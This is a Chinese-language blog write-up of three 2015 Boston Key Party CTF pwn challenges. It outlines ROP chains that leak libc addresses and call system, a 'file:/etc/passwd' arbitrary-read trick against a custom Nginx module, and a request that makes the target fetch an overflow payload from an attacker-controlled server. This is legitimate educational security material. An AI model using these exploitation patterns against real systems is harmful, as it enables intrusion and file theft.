---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2015-03-boston-key-parcty-ctf-2015-harvard/
title: "Boston Key Party CTF 2015 [Harvard Square] [Andrew & Broadway] Write-ups | Orange Tsai"
author: "Orange Tsai"
published: 2015-03-01T16:00:00.000Z
description: "Boston Key Party 是今年 Defcon CTF 的倒數第二場資格賽，雖然只拿了 第二名 不過由於冠軍的 PPP 已經確定保送所以應該是可以遞補上今年 Defcon 決賽資格！！ 比賽幾乎是滿滿的 Pwn 以及 Crypto 而且都是 64-bits 不過看來也是趨勢沒什麼好說的XD 有點慚愧自己 Pwn 的能力太久沒練反而都退步了趁著這次機會好好練習順便學一下想學很久的 Pwnto"
---

* * *

Boston Key Party 是今年 Defcon CTF 的倒數第二場資格賽，雖然只拿了 [第二名](https://ctftime.org/event/163) 不過由於冠軍的 PPP 已經確定保送所以應該是可以遞補上今年 Defcon 決賽資格！！

比賽幾乎是滿滿的 Pwn 以及 Crypto 而且都是 64-bits 不過看來也是趨勢沒什麼好說的XD 有點慚愧自己 Pwn 的能力太久沒練反而都退步了趁著這次機會好好練習順便學一下想學很久的 [Pwntools](https://github.com/Gallopsled/pwntools) XD

# [Harvard Square (Pwn 275)](https://blog.orange.tw/posts/2015-03-boston-key-parcty-ctf-2015-harvard/\#Harvard-Square-Pwn-275 "Harvard Square (Pwn 275)") Harvard Square (Pwn 275)

Harvard 是一個線上 Exploit 購買競標系統，ELF 64-bits with DEP

主要漏洞有兩個

1. 當在回合內還完自己的負債(owed)以及金錢(money) > 99999999 時名字可進入至排行榜，此時會產生 Buffer Overflow ，不過依照遊戲的規則，要在有限的回合內完成似乎不太可能
2. 程式開始時有機會輸入 Cheat Code，讀 40 個 bytes 時不過 buffer 只有 24 bytes 所以會覆蓋到 exploit\_free 以及 string\_free 這兩個 Function Pointer ，這兩個會在後面 gc\_free 時候被引用到所以覆蓋 Function Pointer 可以有一次的任意地址跳轉

![](https://blog.orange.tw/posts/2015-03-boston-key-parcty-ctf-2015-harvard/0c48d67b3def10e2-01.png)

由於遊戲無法執行到好利用的 Buffer Overflow ，所以比較直觀的想法是利用覆蓋 Function Pointer 跳轉去觸發第一個漏洞

可以成功觸發漏洞後接著就是撰寫 Exploit 的部分，程式不大加上是 x64 所以很難構造對應的 ROP，嘗試了很久才發現原來題目有提供 glibc 的 Binary … 不過最後還是在沒有依賴它提供的 GLIBC 下完成 Exploit (否則應該可以省下一半以上的時間…)

首先 Leak Address

> \[AAAAAA…\] + \[pop rdi / ret\] + \[got\_of\_strlen\] + \[call puts\]

透過洩漏的地址算出 system 的地址後再進行攻擊，繼續構造

> \[AAAAAA…\] + \[pop rdi / ret\] + \[cmd string address\] + \[system\_address\]

這裡比較有趣的事因為 ROP gadget 很少所以想不到甚麼辦法洩漏 address 或是構造參數去 read 弄出 /bin/sh 這個字串

最後終於被我想到XD，由於是使用 system 不是 execve 所以可以不用提供絕對路徑，所以只要送個 sh 就好了，反正在英文單字中 sh 是很常出現的字根，找個字串結尾是 “sh\\x00” 的地址設過去即可！

![](https://blog.orange.tw/posts/2015-03-boston-key-parcty-ctf-2015-harvard/1ef8f06abfbdc25b-02.png)

最後附上完整的 Exploit

# [Andrew & Broadway (Pwn 275 & Pwn 275)](https://blog.orange.tw/posts/2015-03-boston-key-parcty-ctf-2015-harvard/\#Andrew-Broadway-Pwn-275-Pwn-275 "Andrew & Broadway (Pwn 275 & Pwn 275)") Andrew & Broadway (Pwn 275 & Pwn 275)

Andrew 跟 Broadway 是一樣的題目，只是兩者的目標不同

本來是只有 Andrew 這題只是比賽途中 Andrew 被找出出題者意料外的漏洞造成不用 Shell in 就可以拿到 Flag 所以為了公平性原本的題目就維持著而加開了 Broadway 換了種方式一定得拿到 Shell 才有 Flag

Andrew 是一個編譯好的 x64 Nginx Binary，整個 Binary 很大如果慢慢看一定看不完，但由於 Nginx 編譯是用最新的版本(1.6.2)，所以大致可以不用考慮 Nginx 自身的漏洞

簡單摸索一下執行檔發現執行檔在編譯的時候多編進了一個 Nginx Module ，所以大概猜這個 Module 上有記憶體相關的弱點可以拿 Shell

整個 Module 很簡單，會對傳進來的路徑使用 `curl_easy_perform` 去下載後判斷類型後進行 prettify, minify, leetfy … 等處理，正確的解法應該是要想辦法讓路徑被 `curl_easy_perform` 當成一個合法的 URL 去下載、存取遠端資源，接著在 minify 函數中由於使用 strlen 判斷遠端資源大小後 memory copy 所以可以在遠端資源中用 Null Byte 來繞過大小的檢查產生 Buffer Overflow

由於 Nginx 在處理路徑時的正規化，會將 Double Slash 轉成 Single Slash (http:// -> http:/) 所以這樣的 payload 會失敗

> http://ATTACK\_SERVER/http://MY\_SERVER/payload.html

不過好玩的是，雖然 `http://` 轉成 `http:/` curl 會不吃，但 `file://` 轉成 `file:/` curl 居然會吃 …

> curl http:/MY\_SERVER
>
> curl ftp:/MY\_SERVER

都會失敗但

> curl file:/etc/passwd

這種錯誤的表達方式居然會被接受XD (正確的表達方式應該是 file:///etc/passwd) 所以一出來被用這種方式繞過 Shell 拿到 Flag 後出題者只好重振旗鼓(?) 重出一題xD

新的 Broadway 題目架構一樣不過比較機車的是 Flag 位置不給你了，所以有了任意讀檔也沒有用非得拿到 Shell 才能翻出 Flag 位置

由於需要有遠端 HTTP Server 配合所以 payload 比較凌亂放上了只給個大致流程XD

觸發漏洞皆使用

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>GET /MY_IP_ADDRESS:12345/payload.html# HTTP/1.0<br>``` |

至於 payload.html 內一樣分成兩次 Leak Address 以及執行 system

洩漏地址

> \[Null Byte\] + \[AAAAAA…\] + \[ROP of dup2(fd,0)\] + \[ROP of dup2(fd,0)\] + \[pop rsi / ret\] + \[got\_of\_dup2\] + \[write address\] …

執行指令

> \[command\] + \[Null Byte\] + \[pop rsi / pop r15 / ret\] + \[0\] + \[0\] + \[xchg eax,ebp / ret\] + \[pop rax / add rsp, 8 / ret\] + \[system\_address\] + \[0\] + \[call eax\]

最後附上這三題的 Binary 有興趣可以自己摸索XD

- [https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/pwning/harvard-square](https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/pwning/harvard-square)
- [https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/pwning/andrew](https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/pwning/andrew)
- [https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/pwning/broadway](https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/pwning/broadway)